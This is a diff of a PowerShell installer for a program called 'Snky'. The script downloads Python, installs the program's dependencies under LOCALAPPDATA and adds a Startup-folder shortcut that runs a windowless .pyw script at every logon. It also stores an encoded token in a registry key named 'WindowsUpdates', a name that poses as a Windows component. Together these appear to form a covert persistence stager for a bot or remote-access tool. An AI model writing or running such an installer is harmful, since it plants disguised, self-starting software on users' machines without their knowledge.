@@ -3,7 +3,7 @@ $pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe
 $pythonInstaller = "$($env:TEMP)\python.exe"
 $reg_path = "HKCU:\Software\WindowsUpdates"
 $property_name = "a"
-$property_value = "GZIP UR TOKEN, B64 ENCRYPT IT AND PASTE IT HERE"
+$property_value = "GZipped, Base 64 Encoded token here"
 
 #PYTHON INSTALLER
 Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller
@@ -20,8 +20,7 @@ cmd.exe /c pip install -r "$($env:LOCALAPPDATA)\Snky\Snky-main\requirements.txt"
 #SCUT
 $WshShell = New-Object -comObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut("$($env:APPDATA)\Microsoft\Windows\Start Menu\Programs\Startup\Snky.lnk")
-$Shortcut.TargetPath = "c:\System32\cmd.exe"
-$Shortcut.Arguments = "$($env:LOCALAPPDATA)\Snky\Snky-main\main.pyw $token"
+$Shortcut.TargetPath = "$($env:LOCALAPPDATA)\Snky\Snky-main\main.pyw"
 $Shortcut.Save()
 
 #REGISTRY
